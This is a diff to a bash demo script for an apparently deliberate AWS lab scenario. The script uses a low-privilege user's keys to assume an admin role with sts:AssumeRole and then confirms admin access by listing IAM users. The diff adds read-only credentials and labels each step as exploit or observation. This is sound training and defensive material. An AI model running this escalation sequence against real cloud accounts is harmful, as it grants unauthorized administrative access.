@@ -11,6 +11,7 @@ export AWS_PAGER=""
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
 # Dim color for command display
@@ -56,22 +57,55 @@ if [ -z "$MODULE_OUTPUT" ]; then
 fi
 
 # Extract credentials and ARNs
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
 ADMIN_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_name')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
+if [ -z "$AWS_REGION" ]; then
+    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
+    AWS_REGION="us-east-1"
+fi
+
+echo "Retrieved access key for: $STARTING_USER"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
+echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
 
 cd - > /dev/null  # Return to scenario directory
 
-# Step 2: Verify identity as starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify identity as starting user
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
@@ -82,8 +116,9 @@ if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 
-# Step 3: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 3: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 3: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -93,8 +128,9 @@ else
 fi
 echo ""
 
-# Step 4: Assume the admin role directly
+# [EXPLOIT] Step 4: Assume the admin role directly
 echo -e "${YELLOW}Step 4: Assuming admin role via sts:AssumeRole${NC}"
+use_starting_creds
 echo "Role ARN: $ADMIN_ROLE_ARN"
 
 show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$ADMIN_ROLE_ARN\" --role-session-name \"sts-001-demo-session\""
@@ -102,16 +138,16 @@ ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
     --role-arn "$ADMIN_ROLE_ARN" \
     --role-session-name "sts-001-demo-session")
 
-# Update credentials to use assumed role
+# Update credentials to use assumed role (dynamic session - do not replace with helpers)
 export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
 
 echo -e "${GREEN}✓ Successfully assumed role $ADMIN_ROLE_NAME${NC}\n"
 
-# Step 5: Verify admin identity
+# [OBSERVATION] Step 5: Verify new identity
 echo -e "${YELLOW}Step 5: Verifying new identity${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Arn' --output text"
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $NEW_IDENTITY"
 
@@ -121,12 +157,13 @@ if [[ ! $NEW_IDENTITY == *"$ADMIN_ROLE_NAME"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified identity as $ADMIN_ROLE_NAME${NC}\n"
 
-# Step 6: Verify we now have admin permissions
-echo -e "${YELLOW}Step 6: Verifying admin permissions${NC}"
+# [EXPLOIT] Step 6: Verify admin permissions with assumed role
+echo -e "${YELLOW}Step 6: Verifying admin permissions with assumed role${NC}"
 echo "Attempting to list IAM users..."
-show_cmd "Attacker" "aws iam list-users --max-items 1"
-if aws iam list-users --max-items 1 > /dev/null; then
-    echo -e "${GREEN}✓ Success! Can now list IAM users${NC}"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+if aws iam list-users --max-items 3 --output table; then
+    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
+    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
 else
     echo -e "${RED}⚠ Unexpected: Cannot list IAM users${NC}"
     exit 1
